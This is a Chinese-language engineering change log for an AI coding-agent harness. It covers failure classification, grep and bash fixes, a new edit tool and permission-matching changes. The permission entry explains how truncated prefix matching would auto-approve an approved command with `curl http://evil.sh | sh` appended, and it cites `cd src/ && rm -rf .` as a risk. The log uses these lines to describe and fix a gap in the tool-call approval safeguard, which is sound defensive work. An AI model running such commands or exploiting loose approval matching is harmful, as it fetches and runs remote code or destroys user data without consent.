- **重复失败保护对“模型把参数写错”这一整类完全失效**（实测，不是推导）：`failed` 只认 `[ERROR]`/`[VERIFY_FAILED]`，grep 缺 `pattern` 连传三次，三次都只拿回干净的 `[INVALID]`，`if (failed)` 一次也没进，两条 `[系统提示]` 一次也没注入。模型能在同一个错参数上烧完全部轮次，收不到任何“你在重复犯错”的信号
- **根因是分类表里没有它的位置**：2026-09-03 那块记的“失败三分类”是**硬失败 / 有效否定 / 用户拒绝**，而 `[INVALID]` 三类都不属于——它既不在硬失败的名单里，也不在列出的有效否定名单（NOT_FOUND/NO_MATCH/EMPTY）里。判定式是白名单，落不进任何一类就等于默认不计。**一个没被想到的分类，行为上等同于“最宽松的那一类”**
- **这与 09-04 那个 grep bug 同构**：都是“工具没能工作”被归到“工具正常工作但答案是没有”。区别是那次错在工具层选错了前缀，这次错在消费层的名单不全
- **改之前先查出两条假绿断言**：E11（verify-tools）与 C4（verify-edit）钉的正是这一行，判定式却是子串匹配 `startsWith('[ERROR]') || resultContent.startsWith('[VERIFY_FAILED]')`。把第三个前缀加在**同一行**时子串仍在 → 断言继续绿，而名字还写着“只认 [ERROR]/[VERIFY_FAILED]”。**它们本该是这次改动的护栏，实际是装饰**

**做出的改动**：
- **判定式加第三个前缀**，并**故意写成多行**（三个 `startsWith` 各占一行）：这样 E11/C4 的子串匹配立刻断掉、逼它们红。写成单行就会静默放过去——这次是拿它当探针用
- **注释从两类扩成三类**，写清分界不是“前缀长什么样”而是“工具到底工作没工作”：① 硬失败 = 抛异常或 `[ERROR]`/`[VERIFY_FAILED]`；② 无效输入 = `[INVALID]`，工具**没能工作**，原样重试必然再错，故计入；③ 有效否定 = NOT_FOUND/NO_MATCH/NOT_FILE/NOT_DIR/EMPTY，工具**正常工作**了、答案是“没有”，不计入——连查三个不同的词都落空是合法探索。把③当②会让模型每查一个不存在的符号都被念一次；把②当③就是改前那个洞
- **E11/C4 判定式升级为“名单精确相等”**：先切出 `failed = resultContent...;` 整句，提取其中全部前缀，再比对 `ERROR,VERIFY_FAILED,INVALID`。既验存在（三个都得在）也验排他（不能有第四个）、且对换行鲁棒。名字与判定式从此**等宽**
- **A5 对照组是 A4 的必要条件**：A4 只钉“`[INVALID]` 连续 2/3 次触发提示”，没有 A5（`[NO_MATCH]` 反复出现**不**触发），A4 可以被“顺手”实现成“除了 `[OK]` 都算失败”而照样全绿。两条一起才钉住“改的是**分类**，不是把闸门全打开”
- **旧前提的五个传播点全部同步**（全库 Grep 取证后逐处读原文核实）：events.ts 的 `ok` 注释、builtin.ts edit 的承重注释、两个验证脚本的头注释①、GLOSSARY 的 grep 词条与前缀表

**解决的问题**：
- 参数错误终于进得了重复失败保护：第 2 次同样调用追加“停止用相同参数重试”、第 3 次追加“放弃这条路径”。这两条文案对参数错误恰好是最贴的——它说的就是“别原样重试”
- 有效否定**没被误伤**（A5 钉住）：`[NO_MATCH]` 连出三次仍然安静，模型的正常探索不会被打断
- E11/C4 从装饰变成真护栏：以后再加第四个前缀、或删掉任一个，两条都会红

**未来可优化**：
- **分类靠字符串前缀，仍是一种字符串协议**：工具层与消费层之间没有类型约束，加一个新前缀要靠人记得改 L252 的名单（现在有两处源码断言盯着，但盯的是“名单等于这三个”，不是“名单覆盖了所有工具会返回的前缀”）。彻底的做法是让 handler 返回结构化结果（`{ status: 'ok' | 'invalid' | 'not_found' | 'error' }` + 文本），前缀只用于给模型看的文案——那是工具参数校验框架那一步的事，本轮不做
- **实测出的前缀全集是 9 个**（`[INVALID]`×12、`[ERROR]`×11、`[OK]`×7、`[NO_MATCH]`×6、`[NOT_FOUND]`×5、`[VERIFY_FAILED]`×3、`[NOT_FILE]`×2、`[NOT_DIR]`×1、`[EMPTY]`×1），而 GLOSSARY 的前缀表只列了 grep 那 5 个。其余前缀散在各工具里，没有一处集中说明它属于三类中的哪一类
- **`[NOT_FILE]`/`[NOT_DIR]`/`[EMPTY]` 归入有效否定是本轮写进注释的，但没有专套断言钉**（A5 只钉了 `[NO_MATCH]`）。若哪天有人把它们挪进计失败一侧，只有 A5 那一条会红、且红的原因看不出是这四个
- 本轮自己踩的方法论坑：**不能信工具返回的 success**。修 verify-edit 一处形近字（“拒绍”→“拒绝”）时，我的 `original_text` 与 `new_text` 写成了完全相同的正确文本，工具返回 success 但**什么也没改**，Read 回文件才发现错字仍在。**本轮写这块时又重演了一次同一个坑**：先写出“用户拒绍”“护栁”（应为护栏）与繁体“牽连”，还把这条教训本身写成“（拒绍→拒绍）”两边一样——全靠写完回读 diff 才抓到

---

## 2026-09-04 23:53 | grep 从“shell 出去调系统 grep”改成“纯 Node 遍历”，bash 的子进程输出解码从“硬编码一种”改成“严格探测 + 代码页回退”

**牵连系统 / 层次**：工具子系统（tools/builtin.ts：grep 的 handler 整段重写、bash 的解码与计数两处、模块级新增 decodeChildOutput / globToRegExp / expandBraces 三个辅助函数）· 验证层（新增 scripts/verify-tools.ts 74 项，补上 TESTING.md 第七节记了很久的“五个工具无直接断言”里的两个）· 文档层（TESTING / 目录 / ARCHITECTURE 三份快照同步到 15 套 556 项、DECISION_LOG 记一条三选一、GLOSSARY 新增 grep 词条、ROADMAP 记一条已完成）。**未动**：core/tools.ts 的契约、permission/manager.ts、loop/agent-loop.ts ——两个工具的返回前缀沿用既有分类，所以调用方一行未改

**面向的问题**：
- **grep 在中文 Windows 上完全不可用，而且它谎报**（实测，不是推导）：它拼的是 POSIX 串 `grep -rn --binary-files=without-match ... 2>/dev/null | head -50`，而 `execSync` 在 Windows 走的是 `cmd.exe /d /s /c`：`grep` 不存在，`2>/dev/null` 被当成路径（实测报“系统找不到指定的路径”）。实测搜一个**确实存在**的符号（`permissionKey`）与搜一个绝不存在的串，返回**一模一样**的 `[NO_MATCH]`。而 `agent-loop.ts` 明确把 `NOT_FOUND/NO_MATCH/EMPTY` 归为“有效否定（不计失败）”，所以它不触发重复失败保护：模型会安静地拿着“项目里没有这个符号”的错误结论继续走。这比乱码严重：它让模型对代码库形成错误认知
- **grep 的 description 还写着“基于 ripgrep (rg) 或系统 grep”**，而代码里两者都没有、也没有回退分支——工具对自己的描述与实现不一致，模型据此选型会选错
- **bash 硬编码 GBK 解码，对外部程序的中文输出全乱码**（实测）：进程之间传的是**字节**，字节不带“我是谁的编码”这个属性，而**谁产生的输出决定编码**：cmd.exe 内建命令（echo / dir / type / chcp）走控制台代码页（中文 Windows = 936，实测 `echo 中文测试` → `d6d0cec4b2e2cad4`），外部程序（node / npm / git / tsc）走自己的编码（通常 UTF-8，实测 → `e4b8ade69687...`）。改前 `node -e "console.log('编译通过')"` 返回“缂栬瘧閫氳繃”，而模型正是靠这段文本判断编译结果的
- **bash 的计数自相矛盾**：`lineCount` 取的是截断后的串，而同一句里的“共 N 字符”取的是截断前的数——输出一万行被截到 4000 字符时标签显示“(50 行输出)”
- **两个缺陷能长期存在的共同原因**：它们都属于“跨进程 / 跨平台”的活，却被当成纯函数写；而 TESTING.md 第七节虽然记着“ls/read/write/grep/bash 五个工具无直接断言”，**已知缺口 ≠ 有人会去补**——没有断言盯着，这两个洞就在生产路径上活了很久

**做出的改动**：
- **grep 改为纯 Node 遍历**：递归 `readdirSync(withFileTypes)` + `readFileSync` + `new RegExp(pattern)` 逐行试。不再依赖系统里装没装 grep / rg，也不再有 shell 引号与重定向的平台差异。上限与跳过规则：`.git`/`node_modules`/`dist` 与点开头目录（与 `ls` 同一份清单）、头部 8KB 内有 NUL 字节的二进制文件（不跳的话一个 .png 能把 50 个名额吃光）、>2MB 的超大文件、5000 个文件总量上限（防误指向盘符根目录）、50 命中上限（与改前的 `head -50` 同量级）
- **四类返回分开**：跑不起来 `[ERROR]`（计入失败、会触发重复失败保护）、真没有 `[NO_MATCH]`、正则编译不了 `[INVALID]`、路径不存在 `[NOT_FOUND]`。`[NO_MATCH]` 里额外回显“已扫 N 个文件”：0 命中时模型需要能区分“扫了 300 个文件确实没有”与“过滤器把所有文件都排除了”（后者是它自己 include 写错了）
- **bash 解码改为探测 + 回退**：新增模块级 `decodeChildOutput(raw)`——先按 UTF-8 **严格**解（`fatal: true`），解得通就是 UTF-8（纯 ASCII 是两者公共子集，怎么解都一样）；解不通再退平台代码页；连回退解码器本身都不可用时（Node 未带 full-icu 则 `'gbk'` 构造抛 RangeError）还有最后一层 `raw.toString('utf-8')`——**这一层是承重的**：改前解码器抛错会落在 handler 的 `try` 里，被报成 `[ERROR] 命令执行失败`，模型会去排查一个根本没坏的执行环境
- **计数改为都按截断前**：`(N 行输出，M 字符)` 与截断提示里的数字一致，不再一前一后矛盾
- **globToRegExp 判掉未闭合的 `{`**：`new RegExp` 按 Annex B 把落单的 `{` 当字面量，编译不报错却匹配不到任何文件——“过滤掉一切”被报成 `[NO_MATCH]`，比“不过滤”更难发现。本缺陷是新建专套的 B11 断言红着查出来的

**解决的问题**：
- 模型对代码库的搜索从“在 Windows 上永远得到假的空结果”变成“真能搜到、且搜不到时会说清扫了多少”（真仓库冒烟：`grep permissionKey src` → 13 处命中、已扫 70 个文件、行号准确；`grep 静默扩权 Log` → 5 处中文命中不乱码）
- 模型跑 `node` / `npm` / `tsc` / `git` 时不再拿到乱码（真仓库冒烟：`git log -1 --format=%s` 从“绮惧噯缂栬緫宸ュ叿”变回正确中文），而 cmd.exe 内建命令那条**没被修坏**（`echo 编译通过` 仍正确）——两侧都有断言
- TESTING.md 第七节“五个工具无直接断言”的缺口收窄到三个（ls / read / write）
- 失败分类从此有双向源码断言盯着（⑤ 段 E11/E12）：改前缀会同时改坏两处，删不掉

**未来可优化**：
- **ls / read / write 三个工具仍无功能专套**（read 的 offset/limit 边界、write 的写回验证、ls 的 depth 与 MAX_ENTRIES）
- **bash 混合编码输出仍会部分乱码**：一条命令同时含两种编码时（如 `echo x && node y`），GBK 字节会让 UTF-8 严格解失败，于是整段按 GBK 解。逐段判编码要先按行切字节再分别试解，代价是可能把一行 UTF-8 中文误判成 GBK（GBK 字符集覆盖面极大，几乎所有双字节组合都“合法”），理由写在 `decodeChildOutput` 头注释里
- **bash 的 30 秒超时不可注入**，超时路径永远无法快速断言（本轮定为不做，已记进 TESTING.md 第七节）
- **grep 的 include 只支持 `*` `?` `{}`**，不支持 `**` 与字符类 `[abc]`；要支持就得自己写半个 glob 引擎，当前判定不值
- **CI 仍未接**，且“远端是 Gitee”这个事实改变了方案（`.github/workflows` 在本仓库会是死配置），见 TESTING.md 第七节
- 本轮自己踩的方法论坑：**源码文本断言不能裸扫全文件**。⑦ 段第一版拿 `grep -rn` / `2>/dev/null` / `execSync` 这些字面串扫整个 builtin.ts，结果 G1/G2/G3 三条被我自己写的“解释改前为什么坏”的注释全部误伤，改完 G1 又红了一次（代码当时已经对了）。现在先切出 grep 那一段、再用**调用形态**（`execSync\(`带括号）而非裸标识符断言，并加了一条 G0 先证明切片本身有效（否则下面几条是空转的假绿）

---

## 2026-09-04 21:54 | 授权键从“args JSON 前 80 字符 + 前缀匹配”改成“工具定义的边界 + 精确匹配”，并把 clear() 接进会话生命周期

**牵连系统 / 层次**：公共接口层（core/tools.ts 加第二个可选成员 `permissionKey?`、core/permission.ts 参数改名 `detail` → `authKey`）· 工具子系统（tools/registry.ts 转发、tools/builtin.ts 三个需确认的工具各给一个键 + `bash` 补弹窗文案）· 权限子系统（permission/manager.ts 换 `Set` 精确匹配并重写注释）· Agent Loop 子系统（loop/agent-loop.ts 权限段：两个变量的截断策略分开）· 运行时编排层（runtime/runtime.ts 的 `clearSession`）· 命令层（commands/builtin/clear.ts 的说明与回执）· 验证层（新增 scripts/verify-permission.ts 62 项；verify-edit.ts 的 A5 与头部承重设计③ 跟着改，因为源码形状变了）· 文档层（ARCHITECTURE.md 第四节第 10 条债标 ✅ 并补“怎么修的”、GLOSSARY 新增 `permissionKey` 词条并改正 `permissionDetail` 词条里已失真的一句、DECISION_LOG 记一条取舍、TESTING / 目录 两份快照同步到 14 套 482 项、ROADMAP 记一条已完成）

**面向的问题**：
- **截断 + 前缀 = 静默扩权**（实测，不是推导）：授权键是 `JSON.stringify(args).slice(0, 80)`，而 `PermissionManager` 用 `startsWith` 匹配。批准过 `node node_modules/typescript/bin/tsc --noEmit && node scripts/run-verify.mjs`（76 字符）之后，同一条命令再接 ` && curl http://evil.sh | sh`（104 字符）也会自动放行——两个键在 80 字符处截成了逐字符相同的字符串。用户点的是“允许这一条”，系统给出的是“允许前 80 字符相同的所有调用”
- **注释声称的目录级授权一次也没生效过**：`manager.ts` 举例“授权 `write:src/` → `write:src/data.txt` 命中前缀 → 自动放行”，但唯一的真实调用方传的键含内容片段（形如 `{"path":"src/data.txt","content":"...`），换一个文件、甚至同一文件换内容就失配。这是本项目第四处“注释里的调用方与真实调用点长期不一致”（前三处：`jsonl-storage.ts` 头注释、`runtime.onInput()`、`appendMessage` 的 `extra`）
- **`clear()` 是项目第三处“支持但未接线”**：契约声明了、`PermissionManager` 实现了、`runtime.permission` 还是 public 字段，但全 `src/` 零调用方 → “本次全部允许”实际是“**本进程**全部允许”，一直有效到退出
- **`bash` 的 `description` 参数承诺“仅用于权限确认提示”，却从未出现在弹窗上**：它只是混在 args 的 JSON 里，而且命令一长就被 80 字符截掉
- 上一轮（`edit`）只把**显示**从匹配键里拆出去（`detail` / `autoKey` 两个变量），匹配与记录仍共用同一个截断串——那一轮阻止了洞变坏，没修洞

**做出的改动**：
- `core/tools.ts`：给 `ToolDefinition` 与 `ToolProvider` 各加第二个**可选**成员 `permissionKey?`（与 `permissionDetail?` 同一手法；做成可选是硬要求，全库 7 处 `ToolProvider` 替身加必需成员会全部打坏）。契约注释写明“该返回的是这次授权的边界”“别塞进每次都变的内容片段”
- `tools/builtin.ts`：三个需确认的工具各定义一个键——`write` / `edit` 是归一化后的 `path`（反斜杠→正斜杠，免得 `src\x.ts` 与 `src/x.ts` 算成两个键），**刻意不含** `content` / `oldText` / `newText`；`bash` 是**完整命令**，一字不截。另给 `bash` 补 `permissionDetail`：有 `description` 时显示“用途: 命令”（命令截到 60 字符），没有就只显示命令；同样受单行约束（`flat()` 把空白压成单个空格）
- `tools/registry.ts`：加 `permissionKey(name, args)` 转发（`this.tools.get(name)?.permissionKey?.(args)`），工具没定义或工具名不存在都返回 `undefined`
- `permission/manager.ts`：`autoAllowed` 从 `string[]` + `some((prefix) => key.startsWith(prefix))` 换成 `Set<string>` + `has(`${toolName}:${authKey}`)` **精确匹配**；注释整段重写，写明“为什么不是把键换成真路径让前缀匹配生效”（`bash` 的键是完整命令，`cd src/` 就以 `/` 结尾，按“以 / 结尾就前缀放行”等于批准 `cd src/ && rm -rf .`）；`clear()` 的注释补上真实调用方
- `core/permission.ts`：两个方法的参数名 `detail` → `authKey`（detail 在本项目专指弹窗文案，同名正是当初混淆的根源），头注释的调用方补上 `runtime.ts`
- `loop/agent-loop.ts`：`autoKey = tools.permissionKey?.(…) || argsJson`（兜底改成**完整** args JSON，不再 `.slice(0, 80)`），`detail = tools.permissionDetail?.(…) || argsJson.slice(0, 80)`（仍截 80）。两个变量的截断策略**刻意相反**，承重注释写在调用点：键不截（截断 + 前缀 = 扩权），文案截（弹窗标题只有 1 行）
- `runtime/runtime.ts`：`clearSession()` 在 `session.clear()` 之后加 `this.permission.clear()`，并补头注释说明为什么连带清授权；`commands/builtin/clear.ts` 的说明改成“清空当前会话与本次工具授权”、回执写明授权一并撤销（UI 不说谎：它现在清的不只是会话）
- 新增 `scripts/verify-permission.ts`（62 项、7 段）：真 `ToolRegistry` + 真 `PermissionManager`（不打桩），③ 段带“改前的截断键确实把这两条命令判成同一个键”的**对照组**（C1 / C2）再钉反例（C4 / C7 / C10 / C11），④ 段把文件级放宽钉成显式断言，⑦ 段造真 `Runtime` 给 `clear()` 接线做**行为证明**（数它被调了几次）

**解决的问题**：
- 授权范围从“args 的 JSON 前 80 字符相同的所有调用”收窄成“**用户点‘本次全部允许’时那一次调用的边界**”：`write` / `edit` 是那个文件，`bash` 是那条命令
- 前缀级授权一并消失：授权 `write:src/x.ts` 不再放行 `write:src/x.ts.bak`（改前 `startsWith` 会放行）
- “本次”终于等于本次会话：`/clear` 与 RPC 的 clear 都走 `clearSession()`，会话清了授权也清
- 弹窗上能看到 `bash` 的用途说明，`description` 参数的承诺兑现了
- 洞被钉死成断言，且带改前对照组：下次谁想把 `.slice(0, 80)` 或 `startsWith` 加回来，会先撞上 `verify-permission.ts` 的 C1 / C2 / C4

**未来可优化**：
- 目录级 / 通配授权明确不做。要做得先有一个“只按路径授权”的独立入口（把文件类工具与命令类工具分开对待），不能靠匹配规则顺带实现
- `bash` 的键是完整命令 → 多一个空格就重新弹窗。要做“命令级白名单”（例如允许所有 `npm run *`）需要命令语义解析，本轮刻意不做
- `write` / `edit` 的文件级放宽若要收紧，得引入内容哈希或 diff 预览，代价是每次确认都要读文件——而 `permissionKey` 的契约明写“不要在这里做文件 I/O”（它在渲染路径上被同步调用）
- 7 处 permission 替身里只有 `verify-permission.ts` 那处实现了 `clear()`（就为了数它被调几次），其余 6 处没有（各自用 `: any`（phase-ab）/ `as never`（c2 / c3 / usage / events）/ 整个 options 对象 `as any`（session）绕开类型）。但归因不能只算到 cast 头上：`tsconfig.json` 的 include 只有 `src/**/*.ts`，`scripts/` 根本不进 tsc（tsx 只剥类型不检查），所以契约即使把 `clear()` 改成必需方法，那 6 处也不会报错——**把 cast 去掉也照样不报**（这是“验证脚本不受类型检查”那条既定取舍的连带代价，见 TESTING.md）
- `verify-permission.ts` 里有一批断言是直接对源码文本做正则（钉承重注释与调用点形状），源码改写措辞时会误报——与 `verify-edit.ts` 同一手法，是“防后人顺手改坏”的既定代价

---

## 2026-09-04 20:37 | 给工具契约加“弹窗文案”这个可选成员，并把兼三职的 detail 拆开：精准编辑工具 edit 落地

**牵连系统 / 层次**：公共接口层（core/tools.ts 的 ToolDefinition 与 ToolProvider 各加一个可选成员）· 工具子系统（tools/builtin.ts 新增第 6 个工具、tools/registry.ts 转发）· Agent Loop 子系统（loop/agent-loop.ts 的权限段）· 提示词层（context/sections/core-section.ts 的【铁律】）· 权限子系统（permission/manager.ts 本轮**一行未改**，只查出债并记入 [ARCHITECTURE.md](./ARCHITECTURE.md#四已知架构债) 第四节第 10 条）· 验证层（新增 scripts/verify-edit.ts 41 项）· 文档层（ROADMAP 关三条已做完的待办 + GLOSSARY 两个新词条 + TESTING / 目录 / ARCHITECTURE 三份现状快照）

**面向的问题**：
- 改文件里的一小段只有 `write` 一条路：把整篇重抄一遍。重抄会把没打算改的地方一并改掉，长文件里还容易漏抄，而且从工具调用记录里看不出“这次到底改了哪几行”
- 权限弹窗的文案是 `JSON.stringify(args).slice(0, 80)`，而这同一个变量兼着三职：`isAutoAllowed()` 的匹配键、`grantAutoAllow()` 的记录键、`onPermission()` 的显示文案。对 `write` 勉强够用（前 80 字符能看到 path），但 `edit` 的参数里有 `oldText` / `newText` 两段文本，前 80 字符连路径都显示不全——用户在看不出要改什么的情况下决定放不放行
- 富文本 detail 与匹配键不能是同一个东西：若让工具自定义的文案同时当匹配键，“本次全部允许”会永远匹配不上（每次文案都不一样），表现为每次都要重新点

**做出的改动**：
- `core/tools.ts`：`ToolDefinition` 与 `ToolProvider` 各加一个**可选**成员 `permissionDetail?`（与 `EventBus.emitHook?`、`SessionStorage.getAllStored?` 同一手法）。做成可选是硬要求：全库有 7 处替身 implements `ToolProvider`，加必需成员会全部打坏
- `loop/agent-loop.ts`：把 `detail` 拆成 `autoKey`（匹配与记录）+ `detail`（显示，`tools.permissionDetail?.(…) || autoKey` 兜底）。`autoKey` 的格式与拆分前**逐字符相同**，所以已记下的授权既不失配也不扩权
- `tools/builtin.ts`：新增 `edit`。四步——按字节读全文 → 数 `oldText` 命中次数 → `indexOf` + 字面切片拼接替换 → 还原行尾与 BOM 后写回并**按字节验证**。命中次数三分流：0 次拒绝、1 次替换、多次拒绝并回**候选行号**（除非显式 `replaceAll: true`）。另加 `requireStringAllowEmpty` 助手（`newText` 传空串是“删掉这一段”的合法意图，不能当缺参拒绝）
- `context/sections/core-section.ts`：【铁律】加一条“改一小段用 edit，不要用 write 重抄全文”，并把“edit 拒绝时先 read 看清原文再重试”写进提示词（否则模型会把拒绝当成工具坏了，转头去用 write）
- 新增 `scripts/verify-edit.ts`（41 项、7 段），用真 `ToolRegistry` + `registerBuiltinTools`（不打桩），在 `fs.mkdtempSync` 临时目录里造各种行尾/BOM 的文件按字节比

**解决的问题**：
- 局部修改不必再重抄全文，“改哪里”从提示词约定变成工具能力
- 弹窗文案与授权匹配键解耦：`edit` 现在显示“改 src/x.ts: 旧片段 → 新片段”，而“本次全部允许”照常工作
- 定位失败被接进既有的“重复失败保护”：`edit` 的 0 命中 / 多命中刻意用 `[ERROR]` 前缀（而不是 `[NO_MATCH]` 这类软前缀），因为 `agent-loop` 只把 `[ERROR]` / `[VERIFY_FAILED]` 记作失败、而重复失败保护只在失败时计数（第 2 次同样调用就追加系统提示叫模型别原样重试）。用软前缀等于把这层保护关掉——这条已写成承重注释 + 断言
- Windows 上的 CRLF 与 BOM 不再被破坏：纯 CRLF 文件在 `\n` 归一化副本上匹配、写回前整体还原（否则模型发来的 `\n` 版 oldText 必然 0 命中，工具会在最需要它的地方失效）；混合行尾按字面匹配，宁可拒绝也不做波及全文的还原
- ROADMAP 的三条失真待办被关掉（P6 系统提示词模板层、P7 系统提示词强化、P7 测试验证闭环）：它们早已做完却还挂着 `- [ ]`，本轮逐条拿代码核实后才关

**未来可优化**：
- `edit` 的“唯一性”是按字面全文算的，不做语法感知（不知道 oldText 落在函数内还是注释里）。再进一步得引入 AST 或 diff 视图，代价是新依赖——与“零运行时依赖”的既定路线冲突
- `PermissionManager` 的前缀匹配同时**过窄**（注释声称的目录级授权从未生效）与**过宽**（前 80 字符相同即共用一次授权），且 `clear()` 是项目第三处“支持但未接线”（“本次全部允许”实际是“本进程全部允许”）。本轮只阻止它变坏，修它属独立任务，见 ARCHITECTURE.md 第四节第 10 条
- 工具参数校验仍是手写 `requireString`，`edit` 又添了一个变体；ROADMAP P6 的“工具参数校验框架”（schema 自动校验）落地后这几个助手可以收掉
- `verify-edit.ts` 只覆盖 `edit`，ls / read / write / grep / bash 五个仍无直接断言（TESTING.md 第七节已记）

---

## 2026-09-04 15:30 | 更正一条贯穿五处的错误前提“会话存储只存纯文本”，并查出被它掩盖的承重结构（runtime 的历史丢弃 ↔ Anthropic 安全阀）

**牵连系统 / 层次**：LLM 协议层（llm/types.ts 的 thinkingBlocks 注释、llm/anthropic.ts 的 resolveAnthropicThinking 注释）· 运行时编排层（runtime.ts 的 toolMessages 组装点与两处 appendMessage 调用点，各加承重警告注释）· 会话存储层（session/jsonl-storage.ts 的 appendMessage / getMessages 两处注释）· 文档层（GLOSSARY 两个词条、ARCHITECTURE.md 第四节新增第 9 条、本文件 2026-08-31 那块的两处行内更正标注）· 验证层（verify-session.ts 新增 ⑨ 段）。注：**运行时行为一行未改**，本轮全部是注释、文档与断言

**面向的问题**：
- 2026-08-31 定义 C3 回放作用域时依据的事实是错的：那块写着“已查证只存纯文本”“会话存储只存纯文本（tool_calls 都不存）”。而 jsonl-storage.ts 自 version 2 起 MessageEntry 就带 tool_calls / tool_call_id / name，appendMessage 的 extra 能写、getMessages() 会还原。错的前提复制进了 llm/types.ts 与 anthropic.ts 的注释、GLOSSARY 的两个词条，共五处，彼此互相印证，读代码的人无从怀疑
- 错前提掩盖了一处真正的架构事实：跨用户轮历史之所以是纯文本，成因不在存储层而在 runtime.ts 的 `history.map((m) => ({ role, content }))`。这道丢弃此前无任何注释，看上去像遗漏，实际是承重的——一旦“顺手补全”成透传，历史里带 tool_calls 的 assistant 轮就没有配对的 thinkingBlocks（块永不落盘），resolveAnthropicThinking 的第一条分支会把 extended thinking 静默全程关闭
- 同一次核对还查出 GLOSSARY 的 JsonlSessionStorage 词条写着“压缩摘要另存在 sessions/*_summary.jsonl”，而全 src/ 无一行代码写该文件：摘要自 v2 起入树为 compaction entry，isSessionFileName() 还专门把含 _summary 的文件排除在 /sessions 列表外。照文档去找摘要文件必然找不到
- 结构化字段的入口同样是断的：runtime.ts 两处 appendMessage 都不传 extra，agent-loop.ts 里一处 appendMessage 都没有，而 jsonl-storage.ts 的头注释声称调用方含“Agent 循环（tool 结果消息）”。于是 tool_calls 持久化是双向死路——没人写、写了也没人读

**做出的改动**：
- 五处错误措辞全部改正，并统一改为“结论不变、换掉理由”：跨用户轮无回放义务这个结论成立，但依据从“存储不存结构化信息”改成“thinkingBlocks 不落盘 + runtime 组装时丢弃 role/content 之外的字段”
- 在三处承重位置加警告注释（runtime.ts 的组装点与写入点、anthropic.ts 的安全阀），写明“这道丢弃不能直接修好，要接通必须先解决历史 thinking 块的回放”，并互相指回 ARCHITECTURE.md 第四节第 9 条
- ARCHITECTURE.md 第四节 8 条 → 9 条，第 9 条按“格式支持 / 入口未接线 / 出口被堵 / 为何不能直接修 / 本轮处理”五段记全，并标明这是项目里第二处“支持但未接线”（第一处 runtime.onInput()，见第 7 条）
- 本文件 2026-08-31 那块的两处错话**不改写原文**（append-only），只在句末加 ⚠ 行内更正标注指向本块——沿用 ARCHITECTURE.md 第四节“保留原状描述以便回溯”的既有惯例
- verify-session.ts 新增 ⑨ 段把事实钉死：真往返（写 tool_calls → 落盘含该键 → getMessages 还原 → reopen 后仍在）证明存储不是纯文本；源码文本断言证明 runtime 两处 appendMessage 不传 extra、组装点只映射 role+content、全 src/ 无 _summary 写入。下次谁想“顺手补全”，先撞上测试

**解决的问题**：
- 错误前提不再自我印证：五处措辞统一到同一个正确成因，且每处都指向 ARCHITECTURE.md 第 9 条这个单一权威叙述
- 承重结构从“隐形”变“显形”：runtime.ts 的丢弃点此前无一句注释，现在任何人改它都会先读到“这会让 extended thinking 全程关闭”
- 文档可信度：GLOSSARY 的 _summary.jsonl 是会导致读者去文件系统里找不到东西的硬错，已消除
- 事实有了防线：⑨ 段断言使“存储只存纯文本”这个说法再也无法被当成事实写回代码或文档而不被测试反驳

**未来可优化**：
- 真要接通历史结构化数据，得先定 thinking 块的持久化策略（落盘 signature 涉及体积与敏感数据，折叠成文本会丢工具调用语义），这是独立的一件事，已记入 ROADMAP 的剩余项
- jsonl-storage.ts 的头注释“调用方”一栏与真实调用点长期不一致（本次是第二处：先前 Agent 循环、这次 _summary），可考虑给“调用方”注释加一条 verify 断言，或干脆改用工具生成
- ARCHITECTURE_LOG 的行内 ⚠ 标注是本次新引入的手法，若后续更正频繁，需要一条规则说明“历史块可以加标注、不可以改原文”

---

## 2026-09-03 10:44 | 把 span 配对从可选扩展抽成公共件 SpanCollector，观测的消费端从此有两个互不依赖的出口（落盘 / 上屏）

**牵连系统 / 层次**：契约层（core/events.ts 加 CollectedSpan + SpanCollector，与已有的 Span/SpanRecorder 并列）· 运行时层（新增 runtime/span-collector.ts；runtime.ts 加两个只读 getter；types.ts 的 RuntimeOptions 加一个必注入项）· 装配层（harness/main.ts 在 createRuntime 闭包外建实例并 attach）· 扩展层（extensions/watchers/trace-log.ts 134 → 78 行）· 命令层（新增 commands/builtin/traces.ts）· 验证层（verify-events ⑨ 段 21 项）。注：事件契约的生产端（三处 trace/beginSpan 调用点）、总线的盖戳与广播逻辑、落盘格式与两个开关全部零改动

**面向的问题**：
- "start 与 end 靠 spanId 认亲"这份配对逻辑只有一份实现，但它住在可选扩展 trace-log 里：核心命令想拿成段的观测数据，就得反过来依赖一个可以被删掉的扩展——依赖方向是错的
- 想看某段花了多久，唯一路径是先设 TS_AGENT_TRACE=1 落盘、再去翻 trace.jsonl；观测结果没有"随手看一眼"的出口
- 配对逻辑一旦被第二个消费者需要，摆在面前的三条路里两条都要付代价：只读 jsonl 等于默认没数据，命令自带一份配对等于同一规则两处实现、将来必然漂移
- 段是嵌套的（prompt 包着 llm_request，llm_request 又包着 tool_call），"合计耗时"若把所有 durationMs 相加会把同一段时间重复计好几遍——这个语义陷阱此前没有任何地方写着

**做出的改动**：
- 契约与实现分开放，沿用项目既有分层惯例：CollectedSpan（一段完整行为的形状）与 SpanCollector（feed / attach / recent / running / drainUnclosed）进 core/events.ts，实现 SpanCollectorImpl 进 runtime/span-collector.ts。它与生产端的 SpanRecorder 恰好对称——一个帮生产端打卡，一个帮消费端收段
- 配对规则从 trace-log 原样迁来而不重写（只认带 spanId 的事件 / _start 进门登记 / _end 出门合并 / 孤儿 end 忽略 / 信封字段剥掉 / 便签段载荷走 attrs）。原样迁来的好处是：迁完跑 verify-events 全绿，就等于证明了落盘行为一字未变
- 两个消费者各持独立实例而不共享：watcher 建 capacity:0 的实例（落盘型只用 feed 的返回值，不必在内存里再留一份历史），main.ts 建缺省 capacity 200 的实例供 /traces 读。理由是总线的意义就是消费者互不知情，落盘的关掉不该影响上屏的；更重要的是依赖方向——核心命令不能反过来依赖一个可选扩展
- collector 建在 main.ts 的 createRuntime 闭包外、与 events 同生命周期：闭包会因热切换重建 Runtime，建在里面的话已收的段会跟着丢
- /traces 走 /diagnostics 的同一范式：Runtime 只读委托（getTraces / getRunningSpans），命令只负责排版。参数纯数字=条数、其他=段名关键字过滤；合计只算 prompt 段（最外层且彼此不重叠，它的和才等于用户真正等掉的墙钟时间），并把这条理由写成命令里的注释
- 未关门的段单独列进"正在跑"块而不混在已收束的段里：这类段的 durationMs 是实时算的，与已收束的段语义不同；关键字过滤对两个块同时生效（初版漏了这一点，已修并补上断言）

**解决的问题**：
- 配对逻辑仍只有一份，但现在住在核心层，两个消费者都能拿到；trace-log 从"配对 + 落盘"瘦成"开关判定 + 落盘格式 + 退出补记"三件事，职责与它的目录名（watchers/：只看只录）终于对得上
